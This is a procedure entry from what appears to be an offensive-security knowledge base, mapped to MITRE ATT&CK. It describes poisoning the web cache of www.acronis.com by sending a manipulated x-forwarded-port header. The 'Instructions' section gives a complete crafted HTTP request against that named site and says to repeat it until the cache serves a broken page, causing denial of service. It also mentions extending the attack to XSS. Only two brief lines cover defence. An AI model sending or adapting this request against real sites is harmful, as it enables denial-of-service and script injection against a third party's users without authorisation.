---
tags:
  - web-cache-poisoning
  - header-manipulation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/poison-request-x-forwarded-port]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 391c7a4e-2c7e-4f1f-994e-2bf65bfccd5a
created_at: '2025-12-13T09:00:34.222Z'
updated_at: '2025-12-13T09:00:34.222Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Poison Cache with X-Forwarded-Port

## Summary

This procedure involves sending repeated HTTP requests with a modified x-forwarded-port header to poison the web cache on www.acronis.com, forcing it to store a version with an invalid port like 0, leading to broken page functionality.

## Description

The attack exploits unkeyed inputs in the cache mechanism, allowing manipulation of cached responses. By altering headers and repeating requests, the cache stores a poisoned page that breaks resource loading (e.g., CSS/JS), causing denial of service. This can be extended to inject XSS or JavaScript for broader impact.

## Requirements

1. Network access to www.acronis.com on port 443
2. Tool like Burp Suite for sending and repeating HTTP requests
3. No authentication required

## Defense

Defensive measures and detection strategies:

- Implement proper cache key normalization and header validation
- Monitor for anomalous header values in logs

## Objectives

1. Poison the cache with invalid port
2. Prepare for denial of service
3. Enable potential attack distribution

## Instructions

### Step 1: Send Poisoning Request

**Context**: Modify headers to include arbitrary x-forwarded-port and repeat until cache is poisoned.

**Command** ([[commands/poison-request-x-forwarded-port]]):
```bash
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
```

> Sends a GET request with modified headers; repeat until 'www.acronis.com:0' appears in response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/poison-request-x-forwarded-port]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- web-cache-poisoning
- header-manipulation
